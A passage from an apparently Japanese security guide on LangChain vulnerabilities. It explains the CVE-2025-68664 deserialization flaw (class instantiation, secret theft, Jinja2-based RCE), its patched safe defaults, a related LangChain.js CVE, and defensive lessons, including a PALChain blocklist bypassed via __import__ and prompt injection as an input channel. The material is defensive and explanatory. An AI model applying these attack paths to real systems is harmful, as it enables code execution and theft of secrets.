シークレット窃取に加えて、もう一つの攻撃面が**クラスのインスタンス化**だ。注入したマニフェストで、信頼済み名前空間（`langchain_core`, `langchain`, `langchain_community`）内の任意の `Serializable` サブクラスを、攻撃者制御のパラメータでインスタンス化できる。`__init__` で副作用（ネットワーク呼び出し・ファイル操作など）を起こすクラスがあれば、それをトリガーにできる。ただし名前空間の検証はこのパッチ以前から効いており、**信頼済み名前空間の外**の任意クラス（例: `os.system` 相当）を直接インスタンス化することはできなかった点は正確に理解しておきたい。さらに Jinja2 テンプレートを復元させられると、Jinja2 が任意 Python を実行しうるため RCE に発展する余地がある。

#### 修正（0.3.81 / 1.2.5）— 安全なデフォルトへの転換

パッチは二段構えだ。第一に `dumps()`/`dumpd()` のエスケープ漏れを修正（`'lc'` を含むユーザー辞書を正しく無害化）。第二に、より重要なのが `load()`/`loads()` の**デフォルトを安全側に倒す破壊的変更**である。

- **`allowed_objects`（新規、デフォルト `'core'`）**: デシリアライズ可能なクラスを allowlist で制限する。`'core'` は `langchain_core` 内のオブジェクトのみ、`'all'` は `mapping.py` の定義全体。任意クラスのインスタンス化を絞り込む。
- **`secrets_from_env` を `True` → `False`** に変更: 環境変数からのシークレット自動読み込みを既定で無効化。前掲の secret 窃取はこのデフォルト変更で塞がれる。
- **`init_validator`（新規、デフォルト `default_init_validator`）**: Jinja2 テンプレートを既定でブロックする。

移行時、標準的な LangChain 型（メッセージ・ドキュメント・プロンプト・`ChatOpenAI` 等の信頼済みパートナー統合）を扱うだけなら変更不要だが、カスタムクラスをデシリアライズする場合は `load(serialized, allowed_objects=[MyCustomClass])` のように明示指定が要る。Jinja2 が必要なら `init_validator=None` を渡すが、Advisory は「シリアライズデータを信頼できる場合にのみ無効化せよ。Jinja2 は任意 Python を実行しうる」と強く警告している。環境変数からのシークレット読み込みが必要なら `secrets_from_env=True` を明示する。

この修正思想は CVE-2025-2828 と共通で、「危険な挙動をデフォルト無効・明示オプトインにする」ことだ。デシリアライザは本質的に「データに書かれた指示でオブジェクトを組み立てる」機能なので、untrusted データに対しては allowlist を効かせなければ pickle 級の危険物になる。

なお同時に JavaScript 版 **LangChain.js の CVE-2025-68665（CVSS 8.6）** も公開された。影響は `@langchain/core` < 0.3.80 および 1.0.0〜1.1.7（修正 0.3.80 / 1.1.8）、`langchain` < 0.3.37 および 1.0.0〜1.2.2（修正 0.3.37 / 1.2.3）。公開日は 2025-12-04。

> 出典: GitHub Security Advisory GHSA-c67j-w6g6-q2cm — https://github.com/advisories/GHSA-c67j-w6g6-q2cm ／ The Hacker News "Critical LangChain Core Vulnerability"（Cyata / Yarden Porat 取材）— https://thehackernews.com/2025/12/critical-langchain-core-vulnerability.html ／ Cyata "LangGrinch"（未取得）— https://cyata.ai/blog/langgrinch-langchain-core-cve-2025-68664/

---

### まとめ — LLM フレームワーク特有の「防御の型」

これらの CVE を貫く教訓は、Flatt Security の記事が整理するとおり「利用側」と「実装側」の二層で捉えると見通しがよい。

**共通する原理**は次の 3 点だ。

1. **LLM の出力・外部ドキュメントは untrusted なデータである。** `exec()`（CVE-2023-34540）、コード生成の実行（CVE-2023-44467）、クロール URL（CVE-2023-46229）、リクエスト先 URL（CVE-2025-2828）、シリアライズ構造（CVE-2025-68664）——すべて「LLM/外部データを信頼できる入力として扱った」ことが病理だ。プロンプトインジェクションが間接的な「入力操作手段」になるため、境界は常に untrusted 側にある。
2. **ブロックリストは破れ、allowlist と安全なデフォルトが効く。** PALChain のブロックリスト方式は `__import__` で回避された。対して RequestsToolkit / LangGrinch は「危険機能はデフォルト無効・明示オプトイン」「デシリアライズ対象を allowlist 化」という安全側デフォルトへ転換した。
3. **アプリ層の緩和には限界があり、多層防御が要る。** SSRF の同一ドメイン制限は同居ホストで破れる。根本対策は「クローラー/リクエストツールに内部ネットワークへの到達性を与えないネットワーク分離」であり、コード上のフィルタはその一枚にすぎない。

**利用側の実務**としては、(a) `PALChain`・`PythonREPLTool`・`allow_dangerous_requests` などリスクの高い実験的・危険機能を設計段階で回避する、(b) `langchain-core` を含む依存を常に最新パッチへ更新し、特に CVE-2025-68664 は `astream_events` の version 指定や `load()` のデフォルト変更に留意する、(c) LLM とツールに与える権限・ネットワーク到達性を最小化する、(d) LLM 出力を後段の危険な sink（コード実行・デシリアライズ・HTTP リクエスト）へ流す経路をレビューし、必要なら中間で検証・サンドボックス化する、という順で優先度を付けるとよい。

---

## ナビゲーション

[← 第5章 RAG・データ・埋め込みの脆弱性](05-rag-data.md)  ｜  [📚 目次（ホーム）](index.md)  ｜  [第7章 実例・ライトアップ・バグバウンティ事例 →](07-case-studies.md)
